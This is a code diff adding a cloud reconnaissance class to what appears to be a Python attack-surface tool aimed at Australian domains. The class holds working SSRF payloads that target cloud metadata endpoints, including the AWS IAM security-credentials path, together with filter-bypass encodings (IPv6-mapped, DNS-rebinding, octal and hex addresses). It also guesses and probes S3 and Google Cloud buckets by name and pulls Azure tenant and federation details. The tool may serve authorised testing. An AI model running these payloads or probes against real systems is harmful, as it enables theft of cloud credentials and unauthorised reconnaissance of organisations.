@@ -357,3 +357,155 @@ if __name__ == '__main__':
     if args.module in ['all','github']:
         store.add_many(GitHubCommitArchaeologist().excavate(args.domain))
     print(json.dumps(store.summary(), indent=2))
+
+
+class CloudMetadataProbe:
+    """
+    Probe cloud metadata endpoints for SSRF and misconfiguration.
+    Targets AWS, GCP, Azure metadata services.
+    """
+
+    METADATA_ENDPOINTS = {
+        "aws_imds_v1":    "http://169.254.169.254/latest/meta-data/",
+        "aws_imds_v2":    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "aws_user_data":  "http://169.254.169.254/latest/user-data",
+        "gcp_metadata":   "http://metadata.google.internal/computeMetadata/v1/",
+        "azure_metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "alibaba":        "http://100.100.100.200/latest/meta-data/",
+        "digitalocean":   "http://169.254.169.254/metadata/v1/",
+        "oracle":         "http://169.254.169.254/opc/v1/instance/",
+    }
+
+    def probe_via_ssrf(self, ssrf_url: str, target_metadata: str = "aws_imds_v1") -> dict:
+        """
+        Test SSRF vulnerability by attempting to reach cloud metadata via target URL.
+        """
+        import requests
+        endpoint = self.METADATA_ENDPOINTS.get(target_metadata, target_metadata)
+        result = {"ssrf_url": ssrf_url, "metadata_target": endpoint, "status": "unknown"}
+
+        payloads = [
+            endpoint,
+            endpoint.replace("http://", "http://"),
+            f"http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv6 bypass
+            f"http://169.254.169.254.xip.io/latest/meta-data/",    # DNS rebinding
+            f"http://0251.0376.0251.0376/latest/meta-data/",        # Octal bypass
+            f"http://0xa9fea9fe/latest/meta-data/",                  # Hex bypass
+        ]
+
+        for payload in payloads:
+            try:
+                test_url = ssrf_url.replace("SSRF_TARGET", payload)
+                r = requests.get(test_url, timeout=8)
+                if any(kw in r.text for kw in ["ami-id", "instance-id", "iam", "project", "subscriptionId"]):
+                    result["status"] = "vulnerable"
+                    result["payload"] = payload
+                    result["response_preview"] = r.text[:500]
+                    return result
+            except Exception:
+                pass
+
+        result["status"] = "not_vulnerable"
+        return result
+
+    def enumerate_aws_s3(self, domain: str) -> list[dict]:
+        """
+        Enumerate S3 buckets related to an AU domain.
+        Tests common naming patterns for public access.
+        """
+        import requests
+        company = domain.split(".")[0]
+        bucket_names = [
+            company, f"{company}-backup", f"{company}-data", f"{company}-files",
+            f"{company}-assets", f"{company}-media", f"{company}-uploads",
+            f"{company}-dev", f"{company}-staging", f"{company}-prod",
+            f"{company}-logs", f"{company}-archive", f"{company}-public",
+            f"{company}-private", f"{company}-internal", f"{company}-au",
+            f"{company}-australia", f"backup-{company}", f"data-{company}",
+            f"www-{company}", f"cdn-{company}", f"static-{company}",
+        ]
+
+        results = []
+        for bucket in bucket_names:
+            for region in ["ap-southeast-2", "us-east-1", ""]:
+                if region:
+                    url = f"https://{bucket}.s3.{region}.amazonaws.com/"
+                else:
+                    url = f"https://{bucket}.s3.amazonaws.com/"
+                try:
+                    r = requests.head(url, timeout=6)
+                    if r.status_code == 200:
+                        results.append({"bucket": bucket, "url": url, "status": "public_readable", "severity": "critical"})
+                    elif r.status_code == 403:
+                        results.append({"bucket": bucket, "url": url, "status": "exists_private", "severity": "medium"})
+                    elif r.status_code == 404:
+                        pass  # Does not exist
+                except Exception:
+                    pass
+
+        return results
+
+    def enumerate_azure_tenant(self, domain: str) -> dict:
+        """
+        Enumerate Azure AD tenant information for an AU domain.
+        Discovers tenant ID, federation info, and registered apps.
+        """
+        import requests
+        result = {"domain": domain, "azure_info": {}}
+
+        # OpenID configuration
+        try:
+            r = requests.get(
+                f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration",
+                timeout=10
+            )
+            if r.status_code == 200:
+                data = r.json()
+                issuer = data.get("issuer", "")
+                tenant_id = issuer.split("/")[3] if "/" in issuer else ""
+                result["azure_info"]["tenant_id"] = tenant_id
+                result["azure_info"]["issuer"] = issuer
+                result["azure_info"]["token_endpoint"] = data.get("token_endpoint", "")
+        except Exception:
+            pass
+
+        # User realm (federation check)
+        try:
+            r = requests.get(
+                f"https://login.microsoftonline.com/common/userrealm/?user=test@{domain}&api-version=2.1",
+                timeout=10
+            )
+            if r.status_code == 200:
+                data = r.json()
+                result["azure_info"]["namespace_type"] = data.get("NameSpaceType", "")
+                result["azure_info"]["federation_brand"] = data.get("FederationBrandName", "")
+                result["azure_info"]["cloud_instance"] = data.get("CloudInstanceName", "")
+                result["azure_info"]["is_federated"] = data.get("NameSpaceType") == "Federated"
+        except Exception:
+            pass
+
+        return result
+
+    def probe_gcp_storage(self, domain: str) -> list[dict]:
+        """Enumerate Google Cloud Storage buckets for an AU domain."""
+        import requests
+        company = domain.split(".")[0]
+        bucket_names = [
+            company, f"{company}-backup", f"{company}-data",
+            f"{company}-assets", f"{company}-media", f"{company}-au",
+            f"backup-{company}", f"data-{company}", f"cdn-{company}",
+        ]
+
+        results = []
+        for bucket in bucket_names:
+            url = f"https://storage.googleapis.com/{bucket}/"
+            try:
+                r = requests.head(url, timeout=6)
+                if r.status_code == 200:
+                    results.append({"bucket": bucket, "url": url, "status": "public", "severity": "critical"})
+                elif r.status_code == 403:
+                    results.append({"bucket": bucket, "url": url, "status": "exists_private", "severity": "medium"})
+            except Exception:
+                pass
+
+        return results
